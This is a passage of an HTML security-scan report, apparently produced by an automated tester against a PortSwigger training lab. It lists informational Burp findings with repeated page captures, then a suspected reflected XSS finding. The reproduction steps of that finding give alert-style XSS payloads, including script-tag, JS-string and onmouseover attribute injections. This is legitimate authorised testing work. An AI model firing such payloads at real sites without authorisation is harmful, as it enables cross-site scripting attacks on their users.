+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;product&quot;&gt;
+                        &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
+                        &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                        &lt;div id=&quot;price&quot;&gt;$45.52&lt;/div&gt;
+                        &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                        &lt;label&gt;Description:&lt;/label&gt;
+                        &lt;p&gt;Give your beloved furry friend their dream birthday. Here at PED, we offer unrivaled entertainment at competitive prices. Starting with our best seller, the Balloon Ride.&lt;/p&gt;
+&lt;p&gt;A large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it's up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.&lt;/p&gt;
+&lt;p&gt;Your dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.&lt;/p&gt;
+&lt;p&gt;You are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover. Give your best friend the time of its life, book today as all early birds have an added bonus of choosing the colors of the balloons.&lt;/p&gt;
+                        &lt;div class=&quot;is-linkback&quot;&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 4. [burp] TLS certificate</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The server presented a valid, trusted TLS certificate. This issue is purely informational.&lt;br&gt;&lt;br&gt;The server presented the following certificates:&lt;br&gt;&lt;br&gt;&lt;h4&gt;Server certificate&lt;/h4&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Issued to:&lt;/b&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td&gt;*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Issued by:&lt;/b&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Amazon RSA 2048 M01&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Valid from:&lt;/b&gt;&amp;nbsp;&amp;nb @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6j5zn5-38</code> — <code>artifacts/_/ev-mr6j5zn5-38/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 5. [burp] Cacheable HTTPS response</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">(confidence: CERTAIN) @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/product</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6j5znk-3a</code> — <code>artifacts/_/ev-mr6j5znk-3a/</code></div><div class="lbl">REQUEST</div><pre>GET /product HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+
+GET /product?productId=2 HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 8144
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;product&quot;&gt;
+                        &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
+                        &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                        &lt;div id=&quot;price&quot;&gt;$45.52&lt;/div&gt;
+                        &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                        &lt;label&gt;Description:&lt;/label&gt;
+                        &lt;p&gt;Give your beloved furry friend their dream birthday. Here at PED, we offer unrivaled entertainment at competitive prices. Starting with our best seller, the Balloon Ride.&lt;/p&gt;
+&lt;p&gt;A large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it's up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.&lt;/p&gt;
+&lt;p&gt;Your dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.&lt;/p&gt;
+&lt;p&gt;You are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover. Give your best friend the time of its life, book today as all early birds have an added bonus of choosing the colors of the balloons.&lt;/p&gt;
+                        &lt;div class=&quot;is-linkback&quot;&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 6. [burp] Cross-domain Referer leakage</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The page was loaded from a URL containing a query string:&lt;ul&gt;&lt;li&gt;https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/product&lt;/li&gt;&lt;/ul&gt;The response contains the following links to other domains:&lt;ul&gt;&lt;li&gt;https://portswigger.net/web-security/dashboard&lt;/li&gt;&lt;li&gt;https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&lt;/li&gt;&lt;li&gt;https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;amp;url=https%3a%2f%2fportswigger. @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/product</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6j5zno-3b</code> — <code>artifacts/_/ev-mr6j5zno-3b/</code></div><div class="lbl">REQUEST</div><pre>GET /product HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+
+GET /product?productId=2 HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 8144
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;product&quot;&gt;
+                        &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
+                        &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                        &lt;div id=&quot;price&quot;&gt;$45.52&lt;/div&gt;
+                        &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                        &lt;label&gt;Description:&lt;/label&gt;
+                        &lt;p&gt;Give your beloved furry friend their dream birthday. Here at PED, we offer unrivaled entertainment at competitive prices. Starting with our best seller, the Balloon Ride.&lt;/p&gt;
+&lt;p&gt;A large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it's up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.&lt;/p&gt;
+&lt;p&gt;Your dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.&lt;/p&gt;
+&lt;p&gt;You are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover. Give your best friend the time of its life, book today as all early birds have an added bonus of choosing the colors of the balloons.&lt;/p&gt;
+                        &lt;div class=&quot;is-linkback&quot;&gt;</pre></div>
+</div>
+<h2 id="suspected">Suspected (needs manual verification)</h2>
+<p class="muted">Leads with one concrete anomaly but without control+2-replay confirmation — verify before relying on them.</p>
+<div class="f" id="finding-7">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 7. [xss-reflected] Suspected Reflected XSS in `message` parameter (filter present, bypasses neutralized)</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> The `message` query param reflects user input verbatim in the HTML response body (confirmed by probe_xss), but all 10 tag/handler filter-bypass vectors were neutralized by server-side sanitization. probe_dom_xss also found no live DOM sink. Reflection context may allow a context-specific bypass (e.g. JS string or attribute injection) not covered by the automated corpus — warrants manual testing with context-aware payloads.</div>
+<div class="desc">The root path (`/`) accepts a `message` query parameter whose value is reflected into the HTML response. Automated testing with a 10-vector filter-bypass corpus confirmed reflection is present but all active tag/event-handler payloads were escaped or stripped. A DOM-based execution test (real browser) also found no live sink. The reflection context (plain HTML text node vs. JS string vs. attribute) was not precisely mapped, leaving open the possibility of a context-specific payload the automated corpus did not cover.</div>
+<div><b>Reproduction</b></div><pre>1. Navigate to `/?message=test` — observe &quot;test&quot; appears in the page body.\n2. Attempt `/?message=&lt;script&gt;alert(1)&lt;/script&gt;` — tag is stripped/escaped.\n3. Manually inspect the exact HTML context where the reflection lands (View Source).\n4. If inside a JS string or an attribute, craft a context-specific payload (e.g. `&quot;-alert(1)-&quot;` or `' onmouseover=alert(1) x='`) and test whether it executes.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6h94zx-v</code> — <code>artifacts/s-0002/ev-mr6h94zx-v/</code></div><div class="lbl">REQUEST</div><pre>GET /?message=verdictdomXmr6h93mkj13ssafe HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-type: text/html
+
+no execution — payload was not run by the browser (escaped / not a live sink)</pre></div>
+</div>
+</body></html>
